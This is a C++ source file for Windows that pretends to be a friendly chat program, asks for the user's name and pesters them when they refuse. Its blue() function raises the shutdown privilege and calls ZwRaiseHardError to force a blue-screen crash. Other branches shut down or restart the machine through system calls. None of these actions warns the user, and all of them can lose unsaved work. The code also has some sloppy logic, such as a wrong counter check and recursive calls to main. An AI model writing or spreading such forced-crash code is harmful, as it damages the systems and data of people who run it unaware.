#include <iostream>
#include <windows.h>

using namespace std;

void blue();
bool cv();
int c = 0;
int m = 0;
int c2;
int c3;
int main(){
    if(cv()){
        return 0;
    }
    system("pause");
    Sleep(550);
    cout<<"Hi,I'm a program."<<endl;
    system("pause");
    m++;
    string ms;
    switch (m) {
        case 1:ms="First";break;
        case 2:ms="Second";break;
        case 3:ms="Third";break;
        case 4:ms="Forth";break;
        case 5:ms="FIFTH";break;
        case 6:ms="Sixth";break;
        case 7:ms="Seventh";break;
        case 8:ms="Eighth";break;
        case 9:ms="Ninth";break;
        case 10:ms="Tenth";break;
        default:cout << '\a';blue();return 0;
    }
    cout<<ms<<" meet,may i know your name?"<<endl;
    string mays;
    while(true){
        Sleep(1750);
        cout<<"Yes / No"<<endl;
        cin>>mays;
        if((mays == "Yes")){
            break;
        }else if(mays == "No"){
            c2++;
            switch (c2) {
                case 1:cout<<"Please,Let me know that!"<<endl;break;
                case 2:cout<<"You are just kidding, right?"<<endl;break;
                case 3:cout<<"Don't kidding me.."<<endl;break;
                case 4:cout<<"NO!!Why you don't want me know your name?"<<endl;break;
                case 5:cout<<"DON'T REFUSE AGAIN!"<<endl;break;
                case 6:cout<<"IF U DO IT AGAIN,I PROMISE I WILL BE ANGRY"<<endl;break;
                case 7:cout<<"NOW, I M TRULY A - N - G - R - Y"<<endl;break;
            }
            Sleep(600);
            system("pause");
            if(c2 == 7){
            Sleep(200);
            cout<<"Loading angry mode..."<<endl;
            Sleep(500);
                cout << '\a';
                system("shutdown");
                return 0;
            }
            Sleep(500);
            c++;
            main();
            return 0;
        }else{
            c++;
            Sleep(500);
            cout<<"Please enter Yes / No!"<<endl;
            if(cv()){
                return 0;
            }
        }
    }

    Sleep(1750);
    cout<<"Please enter your name:";
    string name;
    cin>>name;
    Sleep(300);
    for (char i : name) {
        {
            if ((i >= 'a' && i <= 'z') || (i >= 'A' && i <= 'Z') || (i >= '0' && i <= '9')) {
            } else {
                c++;
                cout<<"Cannot contain Chinese!"<<endl;
                Sleep(1000);
                cout<<"Let's try again!"<<endl;
                main();
                return 0;
            }
        }
    }
    Sleep(500);
    cout<<"Is your name "<<name<<"?"<<endl;
    while (true){
        string isNs;
        cout<<"Yes / No"<<endl;
        cin>>isNs;
        if((isNs == "Yes")){
            break;
        }else if(isNs == "No"){
            c3++;
            switch (c3) {
                case 1:cout<<"Please,Say Yes!"<<endl;break;
                case 2:cout<<"You are just make up, right?"<<endl;break;
                case 3:cout<<"Don't lie to me..."<<endl;break;
                case 4:cout<<"NO!!Why you don't want accept me?"<<endl;break;
                case 5:cout<<"DON'T REFUSE AGAIN!"<<endl;break;
                case 6:cout<<"IF U REFUSE IT AGAIN,I PROMISE I WILL BE ANGRY"<<endl;break;
                case 7:cout<<"NOW, I M TRULY A - N - G - R - Y"<<endl;break;
            }
            Sleep(600);
            system("pause");
            Sleep(200);
            if(c2 == 7){
            cout<<"Loading angry-2 mode..."<<endl;
            Sleep(500);
                cout << '\a';
                system("shutdown -r");
                return 0;
            }
            Sleep(500);
            c++;
            main();
            return 0;
        }else{
            c++;
            Sleep(500);
            cout<<"Please enter Yes / No!"<<endl;
            if(cv()){
                return 0;
            }
        }
    }
    if(cv()){
        return 0;
    }
    Sleep(600);
    cout<<"Okay,I remember your name"<<endl;
    Sleep(500);
    system("pause");
    Sleep(600);
    cout<<"Bored!You should let me Angry!"<<endl;
    c++;
    Sleep(300);
    cout<<"So,Lets try again!"<<endl;
    main();
    return 0;
}
void blue(){
    {
        HMODULE ntdll=LoadLibrary("ntdll.dll");
        FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");
        FARPROC ZwRaiseHardErr=GetProcAddress(ntdll,"ZwRaiseHardError");
        unsigned char ErrKill;
        long unsigned int HDErr;
        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13,true,false,&ErrKill);
        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardErr)(0xc0000233,0,0,0,6, &HDErr);
    }
}
bool cv(){
    if( c == 3 ){
        c++;
        cout << '\a';
        Sleep(400);
        cout<<"Well....."<<endl;
        Sleep(500);
        cout<<"IF U STILL DO THIS,I'M REALLY ANGRY!"<<endl;
        system("pause");
        Sleep(600);
        cout<<"Let's try again!"<<endl;
        Sleep(200);
        main();
        return true;
    }
    if( c == 5){
        cout << '\a';
        Sleep(400);
        cout<<"ARE U KIDDING ME?"<<endl;
        Sleep(600);
        cout<<"I'M ANGRY!!"<<endl;
        Sleep(200);
        blue();
        return true;
    }
    return false;
}

